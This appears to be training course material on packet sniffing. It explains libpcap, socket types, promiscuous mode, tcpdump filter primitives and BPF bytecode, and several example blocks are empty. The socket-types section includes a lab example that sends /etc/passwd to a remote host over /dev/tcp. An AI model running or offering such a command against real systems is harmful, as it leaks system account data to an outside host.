TCPdump, Wireshark, and Berkeley Packet Filters (BPF) are indispensable tools in the arsenal of cybersecurity professionals, offering powerful capabilities for network traffic analysis, monitoring, and troubleshooting. TCPdump, a command-line packet analyzer, provides real-time packet capture and analysis capabilities, allowing users to inspect network traffic on the fly. It is invaluable for diagnosing network issues, identifying suspicious activity, and capturing packets for further analysis. Wireshark, a graphical network protocol analyzer, builds upon TCPdump's functionality by offering a user-friendly interface and advanced features such as packet visualization, protocol decoding, and packet filtering. Wireshark enables cybersecurity professionals to conduct in-depth analysis of network traffic, dissecting protocols, detecting anomalies, and uncovering potential security threats. Additionally, Wireshark's extensibility through plugins and scripting allows for custom analysis and integration with other security tools.

Berkeley Packet Filters (BPF) are a low-level mechanism used by TCPdump and Wireshark to filter and capture packets efficiently at the kernel level. BPF filters allow users to specify criteria for capturing packets, such as source or destination IP addresses, port numbers, or protocol types. By leveraging BPF filters, cybersecurity professionals can focus on relevant network traffic, reducing the volume of data captured and improving analysis efficiency. BPF filters also play a crucial role in optimizing performance and scalability, ensuring that packet capture operations can keep pace with high-speed networks and large traffic volumes.

In summary, TCPdump, Wireshark, and Berkeley Packet Filters are essential tools for cybersecurity professionals, providing comprehensive capabilities for network traffic analysis, monitoring, and troubleshooting. By leveraging these tools, cybersecurity professionals can gain insights into network behavior, detect and investigate security incidents, and enhance overall network security posture.



Resources


Instructor Note


4.1 Describe Network Traffic Sniffing¶
Traffic sniffing can be used interchangeably with terms like Packet sniffers or packet analyzers. It is the process of gathering, collecting, and capturing raw signals on a network medium like twisted pair, fiber, or Wireless. Packets that are not encrypted can be reassembled and read. This process however is limited to only the traffic that can be seen from the collector device. Traffic not on the same shared network segment cannot be captured. Traffic can be diverted to the collector device by using devices like Taps, SPAN, software agents, or MitM attacks.



Resources


Instructor Note


4.1.1 Explain the capture Libraries¶
Packets sent and received from a computer system are not able to be analyzed independently outside the operating system. Libpcap was developed as part of TCPDUMP in 1999 by Network Research Group at Lawrence Berkeley Laboratory for use with UNIX and Linux-based systems. This libpcap library allows users to capture packets that run over a network directly from their NICs. This innovation enabled developers to create applications to decode, display and log intercepted packets. Libpcap was soon made modular to allow other packet capture programs to use it.

Packet Capture Libraries:

Libpcap Libpcap is a portable C/C++ library that is used by Wireshark and TCPDump for network traffic capture. It is installed by default on Linux, BSD, and OS X. It is still being regularly updated and the updates can be tracked on its homepage. Windows uses a similar library named WinPcap that is not installed by default, which is why it must be installed during the Wireshark installation process on a Windows-based PC.

WinPcap Libpcap was ported over from its Linux/Unix roots by Riverbed Technology to be compatible with Windows-based systems. Has been the standard for Windows base systems for many years. On 8 March 2013, the final release (4.1.3) was released and all support ceased.

NPcap With the ceased support for the discontinued WinPcap, the makers of NMAP created NPcap. Based on WinPcap, it is still supported today as a limited release. It does offer improvements over its WinPcap predecessor in terms of speed, portability, security, and efficiency.



Resources


Instructor Note


4.1.2 Describe the use of sniffing tools and methods¶
Packet sniffing has many practical uses today such as:

Network troubleshooting

Packet sniffing helps network administrators identify problems in the network by capturing and analyzing data packets. By examining the details of these packets (such as packet headers, protocols used, and timing), they can pinpoint issues like slow connections, dropped packets, or network congestion. This is helpful for debugging and improving network performance.
Diagnosing improper routing or switching

In complex networks, routing (the path that data takes) and switching (directing data to the correct device) need to work correctly for the network to function properly. Packet sniffing helps identify if data is being misrouted or if switches are not directing data to the right destination. By capturing packets as they travel across the network, administrators can see if packets are being sent to the wrong destination or if there's an issue with the routing table.
Identifying port/protocol misconfigurations

Every device on a network communicates using specific ports and protocols (e.g., HTTP on port 80, HTTPS on port 443). Misconfigurations or improper use of these ports and protocols can lead to communication failures. Packet sniffing allows administrators to see if traffic is being sent over the correct ports or if there are protocol mismatches, helping to resolve configuration issues.
Monitor networking consumption

Packet sniffing can be used to monitor network usage. By examining the packets, administrators can see which devices or applications are consuming the most bandwidth. This is especially useful for detecting unusual traffic patterns, such as excessive use of certain resources, which could be indicative of problems like network congestion or unauthorized use.
Intercepting usernames and passwords

If data is not properly encrypted (e.g., when transmitted over unsecured HTTP instead of HTTPS), packet sniffers can capture sensitive information, including usernames and passwords. This is a security risk, as attackers can intercept unencrypted credentials and gain unauthorized access to systems or accounts.
Intercept and eavesdrop on network communications

Packet sniffing can also be used to intercept and listen to the communication between devices on a network. If encryption is not used, an attacker can gain access to sensitive data being transmitted, such as emails, files, or other personal information. This can be used for espionage, data theft, or even spying on private communications.


Disadvantages of Packet sniffing:

Requires elevated permissions on capture systems.

In most operating systems, packet sniffing requires administrative or root privileges. This is because packet sniffing allows you to capture all network traffic on a system, which includes data that should be private (like encrypted passwords or internal communications).
Can only capture packets that the NIC can see.

A network interface card (NIC) is responsible for connecting a computer or device to a network. A packet sniffer relies on the NIC to "see" the data passing through the network. However, the NIC can only capture traffic that is directly relevant to the device it’s attached to.
Cannot capture local traffic.

Local traffic refers to network communications between devices within the same machine or between devices on the same local network segment (without involving routers or switches). Packet sniffing typically monitors traffic on the network interface, but it might not capture communication that occurs entirely within the system or on the local loopback interface (e.g., traffic between processes running on the same computer).
Can consume massive amounts of system resources.

Packet sniffing involves capturing and analyzing potentially large amounts of data, especially in busy or high-traffic networks. This can put significant strain on system resources such as CPU, memory, and disk space.
Lost packets on busy networks.

On networks with heavy traffic, packet sniffing tools might not be able to keep up with the sheer volume of data being transmitted. As a result, some packets may be missed or dropped, especially if the system running the sniffer is overwhelmed.


Resources


Instructor Note


4.1.2.1 Packets can be captured in two ways:¶
Hardware Packet Sniffers - In the past, the process of traffic sniffing was typically done by using hardware devices because the act of capturing packets was too intensive for computers. It is a purpose-built device that is plugged into a network segment to collect and store network packets. Packets are forwarded to a separate system for further analysis. With the improvement of computer CPUs, stand-alone hardware-based sniffers are rarely used anymore.

Software Packet Sniffers- remaining packet sniffers will fall into this category. The local system is used to collect the packets and the software then provides immediate analysis. Software-based sniffers rely on the network interface card (NIC) in the host system to pass traffic to the OS. NICs are set into one of two modes:

Non-promiscuous: Default for most NICs. NIC will only process traffic destined for its host MAC address. Multicast MAC address groups and broadcast addresses are also received and processed.

Promiscuous: Requires root/kernel permissions to enable. The NIC receives and processes all traffic. Most operating systems can support promiscuous mode. Support can be limited by the NIC hardware and/or drivers.



Resources


Instructor Note


4.1.2.2 Describe Socket Types¶
Understanding socket types for network functions

User Space Sockets:

Stream socket - Normally used with TCP, SCTP, and Bluetooth. A stream socket provides a connection-oriented and sequenced flow of data which has methods for establishment and teardown of connections as well as error detection.
Datagram socket - Normally used with UDP. A datagram socket is connection-less by nature. Sockets built this way can send and receive data, but there is no mechanism to retransmit data if a packet is dropped.
Examples:

Using a User application such as a Web Browser, FTP, Telnet, SSH, netcat, etc to connect to any listening port.


nc 172.16.82.106 22
firefox http://172.16.82.106
wget -r http://172.16.82.106
curl ftp://172.16.82.106
ftp 172.16.82.106
telnet 172.16.82.106
ssh user@172.16.82.106
Using tcpdump or wireshark to read a file


tcpdump -r capture.pcap
Using nmap with no switches (-sS) or -sT


nmap 172.16.82.106
nmap -sT 172.16.82.106
Opening listening ports above the Well-Known range (1024+)


python -m SimpleHTTPServer 7800
nc -lvp 1234
Using /dev/tcp or /dev/udp to transmit data


cat /etc/passwd > /dev/tcp/172.16.82.106/1234
Kernel Space Sockets:

Raw socket - A raw socket allows for the direct sending and receiving of IP packets without automatic protocol-specific transport layer formatting, meaning that all headers are typically included in the packet and not removed when moving up the network stack.

Raw sockets tend to be specially crafted packets that do not follow normal communication methods.
Any traffic that does not have a transport layer header (TCP/UDP) can be a RAW Socket.
icmp - ping
OSPF
EIGRP
Packets that have to be crafted with various flag combinations and other header field manipulation must be created as RAW Sockets. Tools like HPING and Nmap needs to open raw sockets when attempting to set specific flags for performing certain scans.


nmap -sX 172.16.82.106
nmap -sN 172.16.82.106
nmap -sF 172.16.82.106
Tcpdump requires raw sockets in order to receive each packet, in its entirety, for total packet analysis. The operating system normally strips all the headers when receiving data so to examine these packets with their headers intact they have to be captured as RAW Sockets.


tcpdump -w capture.pcap
Using Scapy to craft or modify a packet for transmission

Using Python to craft or modify Raw Sockets for transmission
Opening well ports in the Well-Known range (0-1023) require kernel access.


python -m SimpleHTTPServer 80
nc -lvp 123


Resources


Instructor Note


4.1.2.3 Capture Library (Image)¶


Data is captured off the 'wire' by a NIC in promiscuous mode.
Promiscuous mode is a special mode for network interfaces that allows a system to capture all packets on the network segment, not just those addressed to the host machine.
Data is captured as RAW sockets, which means each network packet is obtained in its original, unprocessed form — complete with all protocol headers intact. This differs from typical system behavior, where headers are usually stripped off before the data is delivered to applications.
The Raw sockets are then sent through the SO_ATTACH_FILTER or SO_ATTACH_BPF file to determine what messages need to be captured. This file is stored in Kernel-space and is a list of 'conditions' supplied by the root user to determine what traffic to capture or what traffic to "filter".

Reference from socket.7


SO_ATTACH_FILTER (since Linux 2.2), SO_ATTACH_BPF (since Linux 3.19)
Attach a classic BPF (SO_ATTACH_FILTER) or an extended BPF (SO_ATTACH_BPF) program to the socket for use as a filter of incoming packets.
A packet will be dropped if the filter program returns zero.
If the filter program returns a nonzero value which is less than the packet's data length, the packet will be truncated to the length returned.
If the value returned by the filter is greater than or equal to the packet's data length, the packet is allowed to proceed unmodified.
The traffic that has passed through the filter is then captured by the LibPcap Library and is forwarded into the user-space application to "parse" the data into a readable format for the user.



Resources


Instructor Note


4.1.2.4 Types of sniffing¶
Active sniffing – Traffic is not only captured but can be manipulated or altered in some way for a network attack.

Active sniffing involves actively injecting packets into the network to elicit responses from other devices. Unlike passive sniffing, active sniffing requires the sniffer to send packets to specific destinations and analyze the responses. Active sniffing can be more intrusive and may raise security concerns, but it can also provide more detailed insights into network behavior.
Some examples of attacks that employ Active sniffing are:
MAC Flooding
DHCP Attacks
DNS Poisoning
Spoofing Attacks
ARP Poisoning
Passive sniffing – Traffic is captured and not modified. This is the most common method of packet sniffing.

Passive sniffing involves monitoring network traffic without actively injecting or modifying packets. It typically uses network monitoring tools or packet capture software to capture packets as they traverse the network. Passive sniffing is often used for network troubleshooting, security monitoring, and performance analysis.
Several applications that send data in clear text are vulnerable to this type of sniffing:
HTTP
SMTP
NNTP
FTP
POP
IMAP
TELNET
DNS


Resources


Instructor Note


4.1.2.5 Popular Software Packet Capture Programs¶
Here are several popular packet capture tools and applications used today to sniff and capture network packets.

tcpdump
Wireshark
tshark
p0f - passive OS fingerprinting tool
NetworkMiner
NetMiner
SolarWinds Network Performance Monitor
BetterCap
EtterCap
Paessler PRTG Network Monitor
ManageEngine NetFlow Analyzer
Savvius Omnipeek
Telerik Fiddler
Colasoft Capsa
Snort


Resources


Instructor Note


4.1.2.6 Other packet Capture Programs¶
There are many other tools and applications that utilize the packet capture libraries with more being developed on the time. Below are several ones of note.

Kismet - packet sniffer for 802.11 wireless LANs
L0phtCrack - password auditing and recovery application.
McAfee ePolicy Orchestrator
ngrep - network capture tool similar to tcpdump
Nmap - has port scanning and OS fingerprinting features
Scapy - packet crafting tool built with python and can sniff packets
Snort - IDS/IPS
Suricata - IDS/IPS


Resources


Instructor Note


4.1.2.7 Understanding Linux Network Interface Naming Standards¶
Traditional Naming Scheme:

Usage:

Older versions of Linux distributions often used the traditional naming scheme by default.
This includes distributions like CentOS 6 and earlier, Debian 8 (Jessie) and earlier, Ubuntu 14.04 (Trusty Tahr) and earlier, and so on.
Some users or administrators might still prefer to use the traditional naming scheme even in newer distributions due to familiarity or specific requirements.
In this scheme, network interfaces are named using the following conventions:

ethX: Ethernet devices are typically named ethX, where X is a number. For example, eth0, eth1, etc.
wlanX: Wireless LAN devices are named wlanX, where X is a number.
pppX: Point-to-Point Protocol devices are named pppX, where X is a number.
tunX or tapX: TUN/TAP devices are named tunX or tapX, where X is a number.

student@blue-internet-host-student:~$ ip address
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
inet 127.0.0.1/8 scope host lo
valid_lft forever preferred_lft forever
inet6 ::1/128 scope host 
valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc pfifo_fast state UP group default qlen 1000
link/ether fa:16:3e:53:fb:d3 brd ff:ff:ff:ff:ff:ff
inet 10.10.0.40/27 brd 10.10.0.63 scope global eth0
valid_lft forever preferred_lft forever
inet6 fe80::f816:3eff:fe53:fbd3/64 scope link 
valid_lft forever preferred_lft forever
Consistent Network Device Naming:

Usage:

Many modern Linux distributions have transitioned to using predictable interface naming schemes by default, especially in recent releases.
This includes distributions like CentOS 7 and later, Debian 9 (Stretch) and later, Ubuntu 16.04 (Xenial Xerus) and later, Fedora, Arch Linux, and others.
Predictable naming schemes are designed to provide more consistent and understandable names for network interfaces, which can be particularly useful in environments with dynamic hardware configurations or virtualization.
This scheme was introduced to address the issues with the traditional naming scheme, especially in modern systems where interfaces might be dynamically added or removed. It aims to provide more consistent and predictable interface names. The most common predictable interface naming convention is based on the following attributes:

All names start with a two-character prefix that signifies the interface type.

en = Ethernet
ib = InfiniBand
sl = Serial line IP (slip)
wl = Wireless local area network (WLAN)
ww = Wireless wide area network (WWAN)
Naming Schemes Hierarchy

By default, systemd will name interfaces using the following policy to apply the supported naming schemes:
Scheme 1: Names incorporating Firmware or BIOS provided index numbers for on-board devices (example: eno1), are applied if that information from the firmware or BIOS is applicable and available, else falling back to scheme 2.
enoX: Ethernet interfaces embedded on the motherboard, where X is a number.
Scheme 2: Names incorporating Firmware or BIOS provided PCI Express hotplug slot index numbers (example: ens1) are applied if that information from the firmware or BIOS is applicable and available, else falling back to scheme 3.
ensX: Ethernet interfaces on add-on cards, where X is a number.
Scheme 3: Names incorporating physical location of the connector of the hardware (example: enp2s0), are applied if applicable, else falling directly back to scheme 5 in all other cases.
enpXsY: PCI network interfaces, where X is the bus number and Y is the slot number.
Scheme 4: Names incorporating interface's MAC address (example: enx78e7d1ea46da), is not used by default, but is available if the user chooses.
Scheme 5: The traditional unpredictable kernel naming scheme, is used if all other methods fail (example: eth0).

student@lin-ops:~$ ip address
    1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
        link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
        inet 127.0.0.1/8 scope host lo
        valid_lft forever preferred_lft forever
        inet6 ::1/128 scope host 
        valid_lft forever preferred_lft forever
    2: ens3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1450 qdisc fq_codel state UP group default qlen 1000
        link/ether fa:16:3e:c5:0a:7f brd ff:ff:ff:ff:ff:ff
        inet 192.168.65.20/27 brd 192.168.65.31 scope global dynamic ens3
        valid_lft 80605sec preferred_lft 80605sec
        inet6 fe80::f816:3eff:fec5:a7f/64 scope link 
        valid_lft forever preferred_lft forever


Resources


Instructor Note


4.2 Perform real-time network traffic sniffing¶


Resources


Instructor Note


4.2.1 Explain TCPDUMP primitives¶
TCPDump is a tool used to capture and display the contents of packets traversing a network interface. TCPDump can use one or more native (primitives) and/or BPF filters. Filters allow you to search for patterns, ASCII, or HEX within a data packet and dissect a pcap to obtain a packet or packets of interest. TCPDump filters can be crafted to be broad to search for any packets that match a specific protocol. It can also be crafted to be very specific, such as filters for a TTL size, flag combinations, and keywords within a packet.



Resources


Instructor Note


4.2.1.1 TCPDUMP Primitive Qualifiers¶
TCPDUMP breaks down its filters into three (3) different capture qualifiers:

type - specifies the 'kind of thing' that the id name or number refers to.

Possible types are:
host
net
port
portrange
Examples: host 192.168.1.1 , net 192.168.1.0/24 , port 22 , portrange 1-1023. If there is no type qualifier, host is assumed.
dir - specifies a particular transfer direction to and/or from id.

Possible directions are:
src
dst
src or dst
src and dst
ra
ta
addr1, addr2, addr3, and addr4.
Examples: src 192.168.1.1 , dst net 192.168.1.0/24 , src or dst port ftp-data. If there is no dir qualifier, src or dst is assumed. The ra, ta, addr1, addr2, addr3, and addr4 qualifiers are only valid for IEEE 802.11 Wireless LAN link layers.
proto - restricts the match to a particular protocol(s).

Possible protos are: ether, fddi, tr, wlan, ip, ip6, icmp, icmp6, arp, rarp, decnet, tcp and udp.
Examples:
ether src 192.168.1.1
arp net 192.168.1.0/24
tcp port 22
udp portrange 1-1023
wlan addr2 0:2:3:4:5:6
If there is no proto qualifier, all protocols consistent with the type are assumed.
Examples: src 192.168.1.1 means (ip or arp or rarp) src 192.168.1.1, net 192.168.1.0/24means (ip or arp or rarp) net 192.168.1.0/24 and port 53 means (tcp or udp) port 53.


Resources


Instructor Note


4.2.1.2 Basic TCPDump options¶
-A Prints the frame payload in ASCII.


tcpdump -A
-D Print the list of the network interfaces available on the system and on which TCPDump can capture packets. For each network interface, a number and an interface name, followed by a text description of the interface, is printed. This can be used to identify which interfaces are available for traffic capture.


tcpdump -D
-i Normally, eth0 will be selected by default if you do not specify an interface. However, if a different interface is needed, it must be specified.


tcpdump -i eth0
-e Prints Data-Link Headers. Default is to print the encapsulated protocol only.


tcpdump -e
-X displays packet data in HEX and ASCII.


tcpdump -X
-XX displays the packet data in HEX and ASCII to include the Ethernet portion.


tcpdump -XX
-w writes the capture to an output file


tcpdump -w something.pcap
-r reads from the pcap


tcpdump -r something.pcap
-v gives more verbose output with details on the time to live, IPID, total length, options, and flags. Additionally, it enables integrity checking.


tcpdump -vv
-n Does not covert protocol and addresses to names


tcpdump -n
Tcpdump for specific protocol traffic.


tcpdump port 80 -vn


Resources


Instructor Note


4.2.1.3 Logical Operators¶
TCPDump can be used for live traffic capture, that much is apparent. Introducing filters with simple logic operators greatly enhances TCPDump's capabilities. The truth table below represents all possible true-false relationships. Since both && and || each has two operands, there are four possible combinations of conditions for the given variables A or B.

Logical operators are symbols or words used to connect two or more expressions, resulting in a compound expression that evaluates to a Boolean value (true or false). These operators are fundamental in programming and decision-making processes.

Primitives may be combined using Logical Operators:
Concatenation: 'and' (&&)* - Returns true if both operands are true.
Alteration: 'or' (||)* - Returns true if at least one operand is true.
Negation: 'not' (!)* - Reverses the logical state of its operand (true becomes false, and vice versa).


Truth Tables

Logical Operators AND (&&) and OR (||)

Operand 1	Operator	Operand 2	Result
TRUE	AND	TRUE	TRUE
TRUE	AND	FALSE	FALSE
FALSE	AND	TRUE	FALSE
FALSE	AND	FALSE	FALSE
TRUE	OR	TRUE	TRUE
TRUE	OR	FALSE	TRUE
FALSE	OR	TRUE	TRUE
FALSE	OR	FALSE	FALSE


Logical Operator NOT (!)

Operator	Operand	Result
NOT	FALSE	TRUE
NOT	TRUE	FALSE
Relational operators are used to compare two values or expressions. They evaluate to a Boolean value (true or false) based on the relationship between the operands.



Relational Operators

Operator	Meaning
<	less than
< =	less than or equal to
>	greater than
>=	greater than or equal to
= (==)	equal to
!=	not equal to


The logical and relational operators can be combined with primitives to perform specific criteria for traffic filtering.

tcpdump for specific protocol traffic of more than one type.


tcpdump port 80 or 22 -vn
tcpdump for a range of ports on 2 different hosts with a destination to a specific network


tcpdump portrange 20-100 and host 10.1.0.2 or host 10.1.0.3 and dst net 10.2.0.0/24 -vn
tcpdump filter for source network 10.1.0.0/24 and destination network 10.3.0.0/24 or dst host 10.2.0.3 and not host 10.1.0.3.


tcpdump "(src net 10.1.0.0/24  && (dst net 10.3.0.0/24 || dst host 10.2.0.3) && (! dst host 10.1.0.3))" -vn


Resources


Instructor Note


4.2.1.4 TCPDump Primitive Examples¶
Simple: Simple primitives are basic filters that match specific attributes of network packets. They are straightforward and generally used to focus on a particular aspect of the traffic. Examples include:

To print all ethernet traffic:


tcpdump ether
To print all packets related to ARP:


tcpdump arp
To print all packets related to ICMP:


tcpdump icmp
To print all ICMP echo-request packets :


tcpdump 'icmp[icmptype] = icmp-echo'
To print all ICMP echo-reply packets :


tcpdump 'icmp[icmptype] = icmp-reply'
To print all packets arriving at or departing from 192.168.1.1:


tcpdump host 192.168.1.1
To print all packets arriving at 192.168.1.1:


tcpdump dst host 192.168.1.1
To print all packets departing from 192.168.1.1:


tcpdump src host 192.168.1.1
To print all packets arriving at or departing from 192.168.1.0/24 network:


tcpdump net 192.168.1.0/24
To print all packets departing from 192.168.1.0/24 network:


tcpdump src net 192.168.1.0/24
To print all packets arriving at 192.168.1.0/24 network:


tcpdump dst net 192.168.1.0/24
To print all packets related to IPv4:


tcpdump ip
To print all packets related to IPv6:


tcpdump ip6
To print all packets related to TCP:


tcpdump tcp
To print all packets related to UDP:


tcpdump udp
To print all packets arriving at or departing from TCP port 22:


tcpdump tcp port 22
To print all packets arriving at TCP port 22:


tcpdump tcp dst port 22
To print all packets departing from TCP port 22:


tcpdump tcp src port 22
To print all packets arriving at or departing from TCP or UDP port 53:


tcpdump port 53
To print all packets with TCP flag ACK set:


'tcp[tcpflags] = tcp-ack'


Complex: Complex primitives combine multiple simple filters using logical operators or refine them to create more specific capture rules. They allow more granular control over the captured data. Examples include:

To print traffic between 192.168.1.1 and either 10.1.1.1 or 10.1.1.2:


tcpdump host 192.168.1.1 and ( 10.1.1.1 or 10.1.1.2 )
To print all IP packets between 10.1.1.1 and any host except 10.1.1.2:


tcpdump ip host 10.1.1.1 and not 10.1.1.2
To print all traffic between local hosts and hosts at Berkeley:


tcpdump net ucb-ether
To print all ftp traffic through internet gateway 192.168.1.1: (note that the expression is quoted to prevent the shell from (mis-)interpreting the parentheses):


tcpdump 'gateway 192.168.1.1 and (port ftp or ftp-data)'
To print traffic neither sourced from nor destined for local hosts (if you gateway to one other net, this stuff should never make it onto your local net).


tcpdump ip and not net localnet
To print the start and end packets (the SYN and FIN packets) of each TCP conversation that involves a non-local host.


tcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net localnet'
To print the TCP packets with flags RST and ACK both set. (i.e. select only the RST and ACK flags in the flags field, and if the result is "RST and ACK both set", match)


tcpdump 'tcp[tcpflags] & (tcp-rst|tcp-ack) == (tcp-rst|tcp-ack)'
To print all IPv4 HTTP packets to and from port 80, i.e. print only packets that contain data, not, for example, SYN and FIN packets and ACK-only packets. (IPv6 is left as an exercise for the reader.)


tcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'
To print IP packets longer than 576 bytes sent through gateway 192.168.1.1:


tcpdump 'gateway 192.168.1.1 and ip[2:2] > 576'
To print IP broadcast or multicast packets that were not sent via Ethernet broadcast or multicast:


tcpdump 'ether[0] & 1 = 0 and ip[16] >= 224'
To print all ICMP packets that are not echo requests/replies (i.e., not ping packets):


tcpdump 'icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply'


Resources


Instructor Note


4.2.1.5 Verify TCPDUMP Primitive and BPF filters¶
When you run tcpdump -d, it takes the filter expression you provided, compiles it into BPF code, and then prints the compiled BPF code to the standard output. This allows you to see the low-level representation of the filter expression and understand how tcpdump processes and filters packets based on that expression.

tcpdump -d "<expression>"

Dump the compiled packet-matching code in a human readable form to standard output and stop.
Please mind that although code compilation is always DLT-specific, typically it is impossible (and unnecessary) to specify which DLT to use for the dump because tcpdump uses either the DLT of the input pcap file specified with -r, or the default DLT of the network interface specified with -i, or the particular DLT of the network interface specified with -y and -i respectively.
In these cases the dump shows the same exact code that would filter the input file or the network interface without -d.
However, when neither -r nor -i is specified, specifying -d prevents tcpdump from guessing a suitable network interface (see -i).
In this case the DLT defaults to EN10MB and can be set to another valid value manually with -y.
Instruction Format: Each instruction consists of several parts:

(xxx): Instruction number. Starting at (000) and incrementing until complete.
instruction [offset]: The offset indicates the position of the packet header field being examined or modified. It specifies the starting byte of the field within the packet header.
instruction [#value]: Operation to be performed on the packet data.

Instructions:
ldh: Load half-word. It loads a 16-bit (2-byte) value from the specified offset.
ldh [20]: Load a Half-Word (2 bytes) starting at byte 20 (20 and 21) from start of packet.
ldb: Load byte. It loads an 8-bit (1-byte) value from the specified offset.
ldb [23]: Load a byte at byte 23 from start of packet.
jeq: Jump if equal. It compares the loaded value with a specified constant value and jumps to the specified location if they are equal.
jeq #0x800: Jump if equal to the hexadecimal value 0x800.
jeq #0x50: Jump if equal to the hexadecimal value 0x50.
jt (xxx): Jump to if true. Goto instruction number specified.
jeq #0x6 jt 11 jf 19: If value equals 0x06 then jump to line 11. If not then goto line 19.
jf (xxx): Jump to if false. Goto instruction number specified.
jeq #0x86dd jt 2 jf 8: If value equals 0x86dd then jump to line 2. If not then goto line 8.
jset [bit wise mask]: Jump if set. If the offset contains any value.
jset #0x1fff jt 19 jf 13: If the value of the last 13 bits in this half-word contain any value then jump to line 19. If not then goto line 13.
ldxb [formula]: Discover value of x.
ldxb 4*([14]&0xf): X will equal the value of the lower half of byte 14 multiplied by 4.
ret [#value]: Return. It specifies the action to be taken if the filter matches or does not match the packet.
ret #65535: Return with the value 65535, indicating a match.
ret #0: Return with the value 0, indicating no match.


Primitive to find arp:


BPF to find arp:


Primitive to find ip and icmp:


BPF to find ip and icmp:


Primitive to find ip6 and icmp6:


BPF to find ip6 and icmp6:


Primitive to find tcp and src port 22:


BPF to find tcp and src port 22:


Primitive to find udp and dst port 53:


BPF to find udp and dst port 53:


Primitive to find tcp and port 80:


BPF to find tcp and port 80:


BPF to find a DSCP 46:


BPF to check the TCP flags for ONLY SYN+ACK:


BPF that will check for SYN+ACK but other flags may be set:


BPF will check the SYN+ACK bits to ensure that the combined value do not equal 0:


BPF that will check for VLAN tag and VLAN 111:


Resources


Instructor Note


4.2.2 Define the function of a Berkley packet filter (BPF)¶
Berkeley Packet Filters were conceived in 1992 as a way to provide a way for filtering packets from kernel to userspace. It consists of bytecode that is injected from userspace to the kernel. In recent years it has been re-written as the eBPF virtual machine that closely resembles the previous BPF functions, yet allows for 64-bit registers and for increasing the number of registers from two to ten. This allows the BPF to take advantage of modern hardware.

TCPDUMP supports the use of BPFs just like primitives. However, BPFs can offer many improvements over primitives in terms of precision and speed. BPFs were engineered to help prevent redundant computations and minimize CPU bottlenecks that can be present when using primitives. However, these improvements come at a cost of potentially more complex expression creation.



Resources


Instructor Note


4.2.3 Compare primitives and BPFs¶
Primitives

CMU/Stanford Packet Filter (CSPF) Model commonly called Boolean Expression Tree
Purpose: Efficiently evaluate filtering logic on network packets (e.g., for firewalls or packet sniffers like tcpdump).
Model: Uses a virtual machine model (stack-based) with a specific instruction set for evaluating packet filters.
Design: CSPF is optimized for safety and performance—filters are verified before execution to ensure they terminate and don't access memory unsafely.
Simple and easy filter expressions
First user-level packet filter model
Memory-stack-based filter machine which can create bottlenecks on model CPUs
can have redundant computations of the same information
Berkeley Packet Filters (BPF)

Control Flow Graph (CFG) Model
Purpose: Analyze the flow of control through a program’s code (functions, loops, conditionals).
Nodes: Represent basic blocks (sequences of instructions with no branches).
Edges: Represent control flow (e.g., jumps, branches, function calls).
Uses a simple (non-shared) buffer model which can make it 1.5 to 20 times faster than CSPF
Can be more complex to create expressions but offer far more precision


Comparison: tcpdump Primitives vs BPF (Berkeley Packet Filter)

Feature	tcpdump Primitives	BPF (Berkeley Packet Filter)
Level	High-level	Low-level (bytecode)
What it is	Human-readable filter expressions (e.g., tcp, port 80, host 192.168.0.1)	Compiled instructions executed in a virtual machine to filter packets
Like...	A search query	The machine code the computer runs to find matches
Used by	You (the user), when writing filters in tcpdump	The kernel, when executing packet filtering
Language	Domain-specific filtering syntax	BPF assembly/bytecode
Execution	Not executed directly — parsed and compiled into BPF	Executed in-kernel to accept or drop packets
Example	tcp and port 443	BPF instructions that check: Is the protocol TCP? Is the port 443?
Compiler	libpcap compiles the primitives into BPF bytecode	Kernel BPF verifier checks and loads the bytecode
Safety	Safe to use, no execution risk	Must be verified for memory safety, termination, and validity (especially in eBPF)
Source: bpf-usenix93 and dive-into-bpf

Filter Format Examples:

TCPDump uses two different formats for tcpdump filters, macro, and BPF format.

Macro:


<macro> <value>
not port 22
BPF:


<protocol header> [offset:length] <relation> <value>
tcp[2:2] !=22


Resources


Instructor Note


6.2.4 Construct a BPF¶


Resources


Instructor Note


4.2.4.1 Kernel API¶
TCPDump opens a network tap by requesting a SOCK_RAW socket and after setsockopt calls, a filter is set with the SO_ATTACH_FILTER option:


sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))
...
setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, ...)
Reference: socket.7


SO_ATTACH_FILTER (since Linux 2.2), SO_ATTACH_BPF (since Linux
3.19)
    Attach a classic BPF (SO_ATTACH_FILTER) or an extended BPF
    (SO_ATTACH_BPF) program to the socket for use as a filter
    of incoming packets.  A packet will be dropped if the
    filter program returns zero.  If the filter program
    returns a nonzero value which is less than the packet's
    data length, the packet will be truncated to the length
    returned.  If the value returned by the filter is greater
    than or equal to the packet's data length, the packet is
    allowed to proceed unmodified.


SO_ATTACH_FILTER: allows us to attach a Berkley Packet Filter to the socket to capture incoming packets. Without any filters the NIC will capture all packets.

The BPF Filter is then running against all received packets on a network interface and those that match filtering criteria are passed on to the network tap file descriptor.

TCPDump asks the kernel to execute a BPF program that works within the kernel context.

BPF Virtual Machine: The BPF machine consists of an accumulator, an index register, a scratch memory store, and an implicit program counter. There is a small set of arithmetic, logical, and jump instructions given in a BPF program written in bytecode.

TCPDump filtering with BPF's:


tcpdump "ether[12:2] = 0x800" -d
(000) ldh    [12]
(001) jeq   0x800,  jt 2  jf 3
(002) ret   #262144
(003) ret   #0
This reads as follows:

ldh - loads half-word (16-bit) value in the accumulator from offset 12 in the ethernet header +

jeq - check if the value is 0x800 and if this is true "jump true" to line 2, if it is false "jump false" to line 3

ret #262144 - returns the default snapshot length in bytes

ret #0 - returns nothing, it didn't meet the criteria in the jeq statement.



Resources


Instructor Note


4.2.4.2 Berkley Packet Filters¶
TCPDump filtering with BPF's and bit-masking: BPF's in conjunction with TCPDump, operators, and bitmasking make for an extremely powerful traffic filtering and parsing tool.

